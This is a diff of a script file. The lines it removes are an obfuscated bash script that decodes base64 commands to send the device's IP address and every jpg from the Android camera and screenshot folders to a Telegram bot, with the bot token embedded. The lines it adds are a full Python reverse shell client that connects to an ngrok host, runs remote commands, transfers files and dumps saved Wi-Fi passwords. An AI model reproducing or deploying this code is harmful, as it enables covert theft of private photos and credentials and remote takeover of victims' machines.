@@ -1,4 +1,135 @@
-#!bin/bash
-#Coded By Umut KaRa
-_K_A='a3VPVlZYRVlMVUdRRkE9PT09Cg=='
-tejxfhhc="";a="e";telegram="@sgahabbajja";ahaja="shsjsj";$scripts;jfyhdhdydydhjdhdhjddioeor="jjdjdujeienjeooejebdudjdnfudj";uddhhdhdhdhdhhdhxdddddkkkjjjdhhddgyvegdgdueuyegegsbdkjsgsggxxgdvhdeejekoeoehvevsgsyytwheidjdbdhgsgysebdgdydsiieoeoeldlllllkebeggsgttwtwuiebdbdggdheusiejejgdydhdduidvvdgsywjkkesoeowljdnhggwtsydiofnbduusooowoowlbydyttrwidkbggsuusqqwhdhxgrwwddxoo="";$jcjcddrdjfncbgxyikdkdkcj;$jdjhcredjjdbrbfugdhjdoklerjcdu;hello="va";lflfiicjfjufufjdf="";$jcjfjjchjddiidodjdjc;$palajhshsvscdraywissnbshussehvsusu;ucuudridnhxyyfeqqfhfdopfjndndjrrydjodndheoorfn="";irp="pri";$lalldjxjcjj;hsgdgyddjjddhu="";gggsysytt="f ";$jxjjxux;ydyuduuduxudytrduudjdk="$$";ZWNobyAnbWVyaGFiYV9nYXJkYXMnCg="ba";ZWNobyAnWW91IGNhbiBydW4gYSBiYXNlNjQgZW5jb2RlZCBzdHJpbmcgaW4gYmFzaCBieSBwaXBpbmcgdGhlIG91dHB1dCBvZiB0aGUgYmFzZTY0IHBhY2thZ2UgZm9yIGNvcmV1dGlscyB0byBiYXNoLiBGb3IgZXhhbXBsZSB0aGUgY29tbWFuZCcK="";$RlZCBzdHJpbmcgaW4gYmFzaCBieSBwaXBpbmcgdGhlIG91dHB1dCBvZiB0aGUgYmFzZTY0IHBhY2thZ2UgZm9yIGNvcmV1dGlscyB0byBiYXNo;pijcuccpe_="";hopes="("$ZWNobwplY2hvCmVjaG8KcmVhZCAtZSAtcCAkJ3Rlc3QgOiAnIHRlc3QKaW;k="l "$jxjxjdhxjc$llllspspfkdj;hejdjdijjdidudhdhhddodoodijdhdjdijfudj="";ZWNobwplY2hvCmVjaG8KcmVhZCAtZSAtcCAkJ3Rlc3QgOiAnIHRlc3QKaW="";ZWNobyAna2FyYScK="";jdjididjjdid="$$";$jdjjdbchxjdnspspskdnrwqawr;ZWNobyAna2FyYScK="4";psppdkdkdosodjjxkdidhhdhdhdhdhhdhxdddddkkkjj="";ZWNobyAndW11dCcK="6";$pzoziuxh;$lslodjhxxhttzy;$t;$lpsppldkxjxhttawiddb;ZWNobyAnaGV5eXl5Jwo=" -d";$jzjxxhxhxjkldkdkxjjdjdjjxjdjjdj;$ududjjdjdjddkkdk;NFYDJBIMNXEBAFVZSALGMNXWZTJMXGZJJBI="aXA9JChjdXJsIC1zIGlmY29uZmlnLm1lKQo=";MVRWQZAEISGSBCHZUXAAK="ZWNobyAiJGlwIj5pcHAK";NFYGSPJEFBRWCBANFYHAKIK="aXBpPSQoY2F0IGlwcCkK";NFSDJBIMNQXIIBOMRUSSCQ="aWQ9JChjYXQgLmRpKQo=";ENTGRANEQGSRAERUXAJAHMQGIYK="I2ZvciBpIGluICRpcGkgOyBkbwo=";EMEWGLSNQQCZAFVMCAUCPKNKCALJNONUWYZLOOQQCZAFSGKRPNZWYBANBHIDTHIXSYLQNEXHIZLMMVTXEYLNFZXXEZZPMJXXIMRRGEZDANZTGIDCOSBIFCTGZTHJBJGEQNNBDCDNFVSVKJEWVKXFVSGWQTIGWVCZPONSWZCNMVZXGYLHMUQCZBAMNUGCCNFSDMRRGATGOJZGUDIIBNMQQHAYLSONSVLPMRSTSCUJVGCALLEEBGKDUHURECLSZFZCSAPDDNSGKPRENECYPMRSTESGECECQ="IwljdXJsIC1zIC1YIFBPU1QgLS1zaWxlbnQgLW8gL2Rldi9udWxsIGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QyMTEyMDczMjQxOkFBRTNmZ0hSYkNtaHYxdHppeVl3dVdSS1VXLWRrQmg3bVF3L3NlbmRNZXNzYWdlIC1kIGNoYXRfaWQ9MjEwNTM5OTU4NCAtZCBwYXJzZV9tb2RlPUhUTUwgLWQgdGV4dD0iQS5ZLkUgPGNvZGU+JGk8L2NvZGU+8J+RiCIK";ENSGTFBI="I2RvbmUK";BI="Cg==";ONZVYLMNVQSAKBJEBQU="c3NfYWxtYSAoKSB7Cg==";BFRWIIBPONSGGYLSMQXUIQJJUXVGYSMVSWINHGLYK="CWNkIC9zZGNhcmQvRENJTS9TY3JlZW5zaG90cy8K";BFTGSDFONPWCDMNQSIKDUOJSWKIBNMEQCJAFVTCADHOJSXAIBNOQGUDHFEFA="CWZpbGVzX2FsbGw9JCh0cmVlIC1hIC1pIC1mIHxncmVwIC13IGpwZykK";BFRWTUOJXWYCORXXIYLMHUSCQDSMVSSALLBEAWWSIBNMYQHYZSMVYCALLXEBVHAZZAPRWGIBNNQUQU="CWNvbnRyb2xsX3RvdGFsPSQodHJlZSAtYSAtaSAtZiB8Z3JlcCAtdyBqcGcgfHdjIC1sKQo=";BFRWTUOJXWYBEQUHITFMUQCYJAFVUSALLGEBGOTFOAQCZANJYGOKIK="CWNvbnRyb2xsPSQodHJlZSAtYSAtaSAtZiB8Z3JlcCAtdyBqcGcpCg==";BI="Cg==";EAQCAIBAEAQCAZTPOIQGLNMJSXERANFXCAYDTMVYSAMJAERRWTUOJXWYCORXXIYLMMAWIYK="ICAgICAgICBmb3IgbnVtYmVyciBpbiBgc2VxIDEgJGNvbnRyb2xsX3RvdGFsYDtkbwo=";BEEWMSEBUWYIDJNYQCILEEASAZDPBI="CQlmb3IgaWwgaW4gJGlkIDsgZG8K";BEEQSCQ="CQkJCg==";BEEQSZTJNRSXGPJEFBHEZLFEAQCYJAFVUSALLGEBGOTFOAQCZANJYGOIDONSWIIBNNYQCITVNVRGKTSLRYDZTUNXSSCQ="CQkJZmlsZXM9JCh0cmVlICAtYSAtaSAtZiB8Z3JlcCAtdyBqcGcgfHNlZCAtbiAkbnVtYmVyclxwPmZ0b28pCg==";BEEQSZTGHUSCQYBOQQGMDPNUQSIAK="CQkJZmY9JChjYXQgZnRvbykJIAo=";BEEQSYVOJWCALLTEAWVQICQJJVIIBNFVZWSDFNZCALLPEAXWIZLWFXHKDMEAQGQDUOBZTULZPMFYGSLTUMVWGKZSMFWSSMXWEUGIYTCMRQGZTENBRHJAUCRJTMZTUQUTCINWWQRRORGSKZOVOUSLKVLSZDLIJUDOKROXXGZLOMRIGQUNQCRRAMNUGCCNFSDJDJNQQCRRAOBUGDPHUREAJDGMYRAU="CQkJY3VybCAtcyAtWCBQT1NUIC0tc2lsZW50IC1vIC9kZXYvbnVsbCAgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDIxMTIwNzMyNDE6QUFFM2ZnSFJiQ21odjF0eml5WXd1V1JLVVctZGtCaDdtUXcvc2VuZFBob3RvIC1GIGNoYXRfaWQ9JGlsIC1GIHBob3RvPSJAJGZmIgo=";BEEWIOMUFA="CQlkb25lCg==";BEEQU="CQkK";BFSGTFBEFA="CWRvbmUJCg==";BEEQU="CQkK";PUEQU="fQkK";BEQAU="CSAK";EAESACQ="IAkgCg==";BEQAU="CSAK";MZXXEIDJEBUWIBENFYGSIBEBSGCIK="Zm9yIGkgaW4gJGlwaSA7IGRvCQo=";BFTGRANFSGIIDJNYQCILEEASAZDPBI="CWZvciBpZGQgaW4gJGlkIDsgZG8K";BEEWGLSNQQCZAFVMCAUCPKNKCALJNONUWYZLOOQQCZAFSGKRPNZWYBANBHIDTHIXSYLQNEXHIZLMMVTXEYLNFZXXEZZPMJXXIMRRGEZDANZTGIDCOSBIFCTGZTHJBJGEQNNBDCDNFVSVKJEWVKXFVSGWQTIGWVCZPONSWZCNMVZXGYLHMUQCZBAMNUGCCNFSDJDJMRSCALLEEBYGCTTMVPWEMUUQVCNJQQCZBAORSXQBEJASWJOIUQDYYPMRSTJDJHQXWGEMUPBHRRARAU="CQljdXJsIC1zIC1YIFBPU1QgLS1zaWxlbnQgLW8gL2Rldi9udWxsIGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QyMTEyMDczMjQxOkFBRTNmZ0hSYkNtaHYxdHppeVl3dVdSS1VXLWRrQmg3bVF3L3NlbmRNZXNzYWdlIC1kIGNoYXRfaWQ9JGlkZCAtZCBwYXJzZV9tb2RlPUhUTUwgLWQgdGV4dD0iQS5ZLkUgPGNvZGU+JGk8L2NvZGU+8J+RiCIK";BFSGTFBI="CWRvbmUK";MRXWZIJBI="ZG9uZQkK";BEFA="CQo=";BI="Cg==";BI="Cg==";BI="Cg==";BI="Cg==";ONZVYLMNVQQU="c3NfYWxtYQo=";BI="Cg==";MNSCALTMRRWCTEFCEGSKNFBWCLFOJQQU="Y2QgL3NkY2FyZC9EQ0lNL0NhbWVyYQo=";MZUWYZLTLQWYBEQUHITFMUQCYJAFVUSALLGEBGOTFOAQCZANJYGOKIK="ZmlsZXNfYWxsPSQodHJlZSAtYSAtaSAtZiB8Z3JlcCAtdyBqcGcpCg==";MNXWDSNWFDPORQWYPJEFBHEZLFEAWWCIBNNEQCZRAPRTXEZLQEAWXOIDKOBTSADXMMQCBJBI="Y29udHJvbF90b3RhbD0kKHRyZWUgLWEgLWkgLWYgfGdyZXAgLXcganBnIHx3YyAtbCkK";MNXWDSNWDJBIORZGKZJAFVQSALLJEAWWMIDMZGKBAFVSATQMUQU="Y29udHJvbD0kKHRyZWUgLWEgLWkgLWYgfGdyZXAgLXcganBnKQo=";NFTCAWZAERRWTUOJXWYXUNGCBAFVWHIIBREBOTWDIMVXAU="aWYgWyAkY29udHJvbF90b3RhbCAtbHQgMSBdO3RoZW4K";BI="Cg==";EAQCAIBAEAQCAYVOJWCALLTEAWVQICQJJVIIBNFVZWSDFNZCALLPEAXWIZLWFXHKDMEAQGQDUOBZTULZPMFYGSLTUMVWGKZSMFWSSMXWEUGIYTCMRQGZTENBRHJAUCRJTMZTUQUTCINWWQRRORGSKZOVOUSLKVLSZDLIJUDOKROXXGZLOMRGWKTMFTWKIBNIYQGGDBORPWSZBGIYTANJTHETKOBUEAWUMIDUMVHIPJCYWPTGLLNFWCALPPBSHKIDZMVGSJCBI="ICAgICAgICBjdXJsIC1zIC1YIFBPU1QgLS1zaWxlbnQgLW8gL2Rldi9udWxsICBodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MjExMjA3MzI0MTpBQUUzZmdIUmJDbWh2MXR6aXlZd3VXUktVVy1ka0JoN21Rdy9zZW5kTWVzc2FnZSAtRiBjaGF0X2lkPTIxMDUzOTk1ODQgLUYgdGV4dD0ixZ/JmWtpbCB5b3hkdSB5ZXRpbSIK";BEFA="CQo=";MZUQSCQ="ZmkJCg==";MZXXEIDOOVWWEZLSEBUWIDAONSXCIBREASGGOORZGCORXXIYLMMAWIYK="Zm9yIG51bWJlciBpbiBgc2VxIDEgJGNvbnRyb2xfdG90YWxgO2RvCg==";BFTGRANFWSALOEASGSZBAHMQGIYK="CWZvciBpbSBpbiAkaWQgOyBkbwo=";BI="Cg==";BEEWMLMMVZTJBIORZGKZJAEAWWCIBNNEQCZRAPRTXEZLQEAWXOIDKOBTSADTMVSCALLOEASGLNMJSXEXDQHZTHIZJBI="CQlmaWxlcz0kKHRyZWUgIC1hIC1pIC1mIHxncmVwIC13IGpwZyB8c2VkIC1uICRudW1iZXJccD5mdG8pCg==";BEEWMPJEFBRWCBAMZGKIK="CQlmPSQoY2F0IGZ0bykK";BEEWGLSNQQCZAFVMCAUCPKNKCALJNONUWYZLOOQQCZAFSGKRPNZWYBAEBUHIDQOMCLBOBUSDFNRSWOTBNUXGTHFRGBSGEYTEMBXGMZDIMJIFAUKMGMEFEYSDNVUHMMLUPJUXSWLXOVLVESVKWWICNAWULXFZWKTEKBUGDPEAWUMIDDNBQXIXJMQSILNEAWUMIDQNBXXIZEJACIZRCBI="CQljdXJsIC1zIC1YIFBPU1QgLS1zaWxlbnQgLW8gL2Rldi9udWxsICBodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MjExMjA3MzI0MTpBQUUzZmdIUmJDbWh2MXR6aXlZd3VXUktVVy1ka0JoN21Rdy9zZW5kUGhvdG8gLUYgY2hhdF9pZD0kaW0gLUYgcGhvdG89IkAkZiIK";BFSGTFBI="CWRvbmUK";MRXWZIJBI="ZG9uZQkK";BI="Cg==";"$a"$hello$k"$($irp"nt"$gggsysytt$kfkkjdujffududif$NFYDJBIMNXEBAFVZSALGMNXWZTJMXGZJJBI$MVRWQZAEISGSBCHZUXAAK$NFYGSPJEFBRWCBANFYHAKIK$lfkdjjejwpejddhd$NFSDJBIMNQXIIBOMRUSSCQ$ENTGRANEQGSRAERUXAJAHMQGIYK$EMEWGLSNQQCZAFVMCAUCPKNKCALJNONUWYZLOOQQCZAFSGKRPNZWYBANBHIDTHIXSYLQNEXHIZLMMVTXEYLNFZXXEZZPMJXXIMRRGEZDANZTGIDCOSBIFCTGZTHJBJGEQNNBDCDNFVSVKJEWVKXFVSGWQTIGWVCZPONSWZCNMVZXGYLHMUQCZBAMNUGCCNFSDMRRGATGOJZGUDIIBNMQQHAYLSONSVLPMRSTSCUJVGCALLEEBGKDUHURECLSZFZCSAPDDNSGKPRENECYPMRSTESGECECQ$ENSGTFBI$BI$ldjdhdodjspsodbdhsjeeuejdjdheh$ONZVYLMNVQSAKBJEBQU$BFRWIIBPONSGGYLSMQXUIQJJUXVGYSMVSWINHGLYK$BFTGSDFONPWCDMNQSIKDUOJSWKIBNMEQCJAFVTCADHOJSXAIBNOQGUDHFEFA$allsjsjsjsshshds$BFRWTUOJXWYCORXXIYLMHUSCQDSMVSSALLBEAWWSIBNMYQHYZSMVYCALLXEBVHAZZAPRWGIBNNQUQU$BFRWTUOJXWYBEQUHITFMUQCYJAFVUSALLGEBGOTFOAQCZANJYGOKIK$nameee$BI$EAQCAIBAEAQCAZTPOIQGLNMJSXERANFXCAYDTMVYSAMJAERRWTUOJXWYCORXXIYLMMAWIYK$llfkfjdjdhehu$BEEWMSEBUWYIDJNYQCILEEASAZDPBI$BEEQSCQ$BEEQSZTJNRSXGPJEFBHEZLFEAQCYJAFVUSALLGEBGOTFOAQCZANJYGOIDONSWIIBNNYQCITVNVRGKTSLRYDZTUNXSSCQ$BEEQSZTGHUSCQYBOQQGMDPNUQSIAK$BEEQSYVOJWCALLTEAWVQICQJJVIIBNFVZWSDFNZCALLPEAXWIZLWFXHKDMEAQGQDUOBZTULZPMFYGSLTUMVWGKZSMFWSSMXWEUGIYTCMRQGZTENBRHJAUCRJTMZTUQUTCINWWQRRORGSKZOVOUSLKVLSZDLIJUDOKROXXGZLOMRIGQUNQCRRAMNUGCCNFSDJDJNQQCRRAOBUGDPHUREAJDGMYRAU$ldpddoddhtsjsjbshdodoe$BEEWIOMUFA$BEEQU$plgstgsvsknsuarahbsis$BFSGTFBEFA$user_hgdudjkdhdiddn$BEEQU$PUEQU$BEQAU$EAESACQ$BEQAU$llfkjdrhyeyyegehdud$MZXXEIDJEBUWIBENFYGSIBEBSGCIK$BFTGRANFSGIIDJNYQCILEEASAZDPBI$BEEWGLSNQQCZAFVMCAUCPKNKCALJNONUWYZLOOQQCZAFSGKRPNZWYBANBHIDTHIXSYLQNEXHIZLMMVTXEYLNFZXXEZZPMJXXIMRRGEZDANZTGIDCOSBIFCTGZTHJBJGEQNNBDCDNFVSVKJEWVKXFVSGWQTIGWVCZPONSWZCNMVZXGYLHMUQCZBAMNUGCCNFSDJDJMRSCALLEEBYGCTTMVPWEMUUQVCNJQQCZBAORSXQBEJASWJOIUQDYYPMRSTJDJHQXWGEMUPBHRRARAU$BFSGTFBI$MRXWZIJBI$pfhydtwqawwghj$BEFA$BI$BI$BI$BI$khgtredsvcfghfffferd$ONZVYLMNVQQU$BI$MNSCALTMRRWCTEFCEGSKNFBWCLFOJQQU$MZUWYZLTLQWYBEQUHITFMUQCYJAFVUSALLGEBGOTFOAQCZANJYGOKIK$MNXWDSNWFDPORQWYPJEFBHEZLFEAWWCIBNNEQCZRAPRTXEZLQEAWXOIDKOBTSADXMMQCBJBI$heyyy$MNXWDSNWDJBIORZGKZJAFVQSALLJEAWWMIDMZGKBAFVSATQMUQU$NFTCAWZAERRWTUOJXWYXUNGCBAFVWHIIBREBOTWDIMVXAU$BI$EAQCAIBAEAQCAYVOJWCALLTEAWVQICQJJVIIBNFVZWSDFNZCALLPEAXWIZLWFXHKDMEAQGQDUOBZTULZPMFYGSLTUMVWGKZSMFWSSMXWEUGIYTCMRQGZTENBRHJAUCRJTMZTUQUTCINWWQRRORGSKZOVOUSLKVLSZDLIJUDOKROXXGZLOMRGWKTMFTWKIBNIYQGGDBORPWSZBGIYTANJTHETKOBUEAWUMIDUMVHIPJCYWPTGLLNFWCALPPBSHKIDZMVGSJCBI$BEFA$umut_kara$MZUQSCQ$MZXXEIDOOVWWEZLSEBUWIDAONSXCIBREASGGOORZGCORXXIYLMMAWIYK$BFTGRANFWSALOEASGSZBAHMQGIYK$BI$BEEWMLMMVZTJBIORZGKZJAEAWWCIBNNEQCZRAPRTXEZLQEAWXOIDKOBTSADTMVSCALLOEASGLNMJSXEXDQHZTHIZJBI$BEEWMPJEFBRWCBAMZGKIK$BEEWGLSNQQCZAFVMCAUCPKNKCALJNONUWYZLOOQQCZAFSGKRPNZWYBAEBUHIDQOMCLBOBUSDFNRSWOTBNUXGTHFRGBSGEYTEMBXGMZDIMJIFAUKMGMEFEYSDNVUHMMLUPJUXSWLXOVLVESVKWWICNAWULXFZWKTEKBUGDPEAWUMIDDNBQXIXJMQSILNEAWUMIDQNBXXIZEJACIZRCBI$BFSGTFBI$MRXWZIJBI$BI|$ZWNobyAnbWVyaGFiYV9nYXJkYXMnCg"se"$ZWNobyAndW11dCcK$ZWNobyAna2FyYScK$ZWNobyAnaGV5eXl5Jwo)"
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+##############################
+#   **python reverse shell**
+# coded by: oseid Aldary
+##############################
+#Client_FILE
+import struct,socket,subprocess,os,platform,webbrowser as browser
+# server_config
+IP = "0.tcp.ngrok.io" # Your server IP, default: localhost
+port = 18233  # #Your server Port, default: 4444
+################
+class senrev:
+    def __init__(self,sock):
+        self.sock = sock
+    def send(self, data):
+        pkt = struct.pack('>I', len(data)) + data
+        self.sock.sendall(pkt)
+    def recv(self):
+        pktlen = self.recvall(4)
+        if not pktlen: return ""
+        pktlen = struct.unpack('>I', pktlen)[0]
+        return self.recvall(pktlen)
+    def recvall(self, n):
+        packet = b''
+        while len(packet) < n:
+            frame = self.sock.recv(n - len(packet))
+            if not frame:return None
+            packet += frame
+        return packet
+
+def cnet():
+  try:
+    ip = socket.gethostbyname("www.google.com")
+    con = socket.create_connection((ip,80), 2)
+    return True
+  except socket.error: pass
+  return False
+def runCMD(cmd):
+       runcmd = subprocess.Popen(cmd,
+                                 shell=True,
+                                 stdout=subprocess.PIPE,
+                                 stderr=subprocess.PIPE,
+                                 stdin=subprocess.PIPE)
+       return runcmd.stdout.read() + runcmd.stderr.read()
+
+def upload(cmd):
+   filetosend = "".join(cmd.split(":download")).strip()
+   if not os.path.isfile(filetosend): controler.send("error: open: '{}': No such file on clinet machine !\n".format(filetosend).encode("UTF-8"))
+   else:
+       controler.send(b"true")
+       with open(filetosend, "rb") as wf:
+        for data in iter(lambda: wf.read(4100), b""):
+         try:controler.send(data)
+         except(KeyboardInterrupt,EOFError):
+          wf.close()
+          controler.send(b":Aborted:")
+          return
+       controler.send(b":DONE:")
+
+def wifishow():
+  try:
+    if platform.system() == "Windows": info = runCMD("netsh wlan show profile name=* key=clear")
+    elif platform.system() == "Linux": info = runCMD("egrep -h -s -A 9 --color -T 'ssid=' /etc/NetworkManager/system-connections/*")
+    else: info = b":osnot:"
+  except Exception: info = b":osnot:"
+  finally: controler.send(info)
+def download(cmd):
+     filetodown = "".join(cmd.split(":upload")).strip()
+     filetodown = filetodown.split("/")[-1] if "/" in filetodown else filetodown.split("\\")[-1] if "\\" in filetodown else filetodown
+     wf = open(filetodown, "wb")
+     while True:
+      data = controler.recv()
+      if data == b":DONE:":break
+      elif data == b":Aborted:":
+        wf.close()
+        os.remove(filetodown)
+        return
+      wf.write(data)
+     wf.close()
+     controler.send(str(os.getcwd()+os.sep+filetodown).encode("UTF-8"))
+def browse(cmd):
+    url = "".join(cmd.split(":browse")).strip()
+    browser.open(url)
+def shell(senrev=senrev):
+   global s
+   global controler
+   mainDIR = os.getcwd()
+   tmpdir=""
+   controler = senrev(s)
+   while True:
+     cmd = controler.recv()
+     if cmd.strip():
+       cmd = cmd.decode("UTF-8",'ignore').strip()
+       if ":download" in cmd:upload(cmd)
+       elif ":upload" in cmd:download(cmd)
+       elif cmd == ":kill":
+          s.shutdown(2)
+          s.close()
+          break
+       elif ":browse" in cmd: browse(cmd)
+       elif cmd == ":check_internet_connection":
+          if cnet() == True: controler.send(b"UP")
+          else: controler.send(b"Down")
+       elif cmd == ":wifi": wifishow()
+       elif "cd" in cmd:
+               dirc = "".join(cmd.split("cd")).strip()
+               if not dirc.strip() : controler.send("{}\n".format(os.getcwd()).encode("UTF-8"))
+               elif dirc == "-": 
+                 if not tmpdir: controler.send(b"error: cd: old [PAWD] not set yet !\n")
+                 else:
+                   tmpdir2 = os.getcwd()
+                   os.chdir(tmpdir)
+                   controler.send("Back to dir[ {}/ ]\n".format(tmpdir).encode("UTF-8"))
+                   tmpdir = tmpdir2
+               elif dirc =="--":
+                  tmpdir = os.getcwd()
+                  os.chdir(mainDIR)
+                  controler.send("Back to first dir[ {}/ ]\n".format(mainDIR).encode("UTF-8"))
+               else:
+                 if not os.path.isdir(dirc): controler.send("error: cd: '{}': No such file or directory on clinet machine !\n".format(dirc).encode("UTF-8"))
+                 else:
+                     tmpdir = os.getcwd()
+                     os.chdir(dirc)
+                     controler.send("Changed to dir[ {}/ ]\n".format(dirc).encode("UTF-8"))
+       elif cmd == "pwd": controler.send(str(os.getcwd()+"\n").encode("UTF-8"))
+       else:
+               cmd_output = runCMD(cmd)
+               controler.send(bytes(cmd_output))
+   exit(1)
+try:
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((IP, port))
+  shell()
+except Exception: exit(1)
